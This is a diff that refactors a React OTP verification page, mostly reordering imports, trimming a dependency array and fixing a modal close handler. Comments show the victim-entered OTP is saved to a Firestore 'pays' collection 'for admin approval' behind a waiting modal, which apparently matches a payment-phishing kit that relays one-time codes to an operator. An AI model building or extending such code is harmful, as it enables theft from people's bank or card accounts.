@@ -4,12 +4,12 @@ import type React from "react";
 
 import { useCallback, useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { STCModal } from "../components/STCModal";
+import { addData, db } from "../apis/firebase";
 import { resendOtp } from "../lib/actions";
-import OtpInput from "../components/otp-input";
-import { WaitingApprovalModal } from "../components/WaitingApprovalModal";
 import FirestoreRedirect from "./rediract-page";
-import { addData } from "../apis/firebase";
+import OtpInput from "../components/otp-input";
+import { STCModal } from "../components/STCModal";
+import { WaitingApprovalModal } from "../components/WaitingApprovalModal";
 
 export default function OtpVerification() {
   const router = useNavigate();
@@ -74,7 +74,6 @@ export default function OtpVerification() {
       await resendOtp(JSON.parse(orderId));
       setTimer(120); // Reset timer to 2 minutes
       setError("");
-      // eslint-disable-next-line @typescript-eslint/no-unused-vars
     } catch (error) {
       setError("حدث خطأ أثناء إعادة إرسال الرمز");
     }
@@ -84,7 +83,6 @@ export default function OtpVerification() {
   const getDataFromFirestore = async (collection: string, docId: string) => {
     try {
       // Import Firebase functions
-      const { db } = await import("../apis/firebase");
       const { doc, getDoc } = await import("firebase/firestore");
 
       const docRef = doc(db, collection, docId);
@@ -123,7 +121,6 @@ export default function OtpVerification() {
 
         // Store the OTP in Firestore for admin approval
         try {
-          const { db } = await import("../apis/firebase");
           const { doc, updateDoc, setDoc } = await import("firebase/firestore");
 
           // Update the pays collection with the OTP
@@ -198,12 +195,12 @@ export default function OtpVerification() {
         setError("حدث خطأ أثناء التحقق من الرمز");
       }
     },
-    [otp, router, _id, showApprovalModal]
+    [otp, router, showApprovalModal]
   );
 
   return (
     <>
-      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+      {_id && <FirestoreRedirect id={_id} collectionName="pays" />}
 
       <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12 md:py-20 px-4">
         <div className="max-w-2xl mx-auto">
@@ -311,6 +308,7 @@ export default function OtpVerification() {
         <STCModal
           isOpen={showSTCModal}
           onClose={(): void => {
+            setShowSTCModal(false);
           }}
         />
       )}
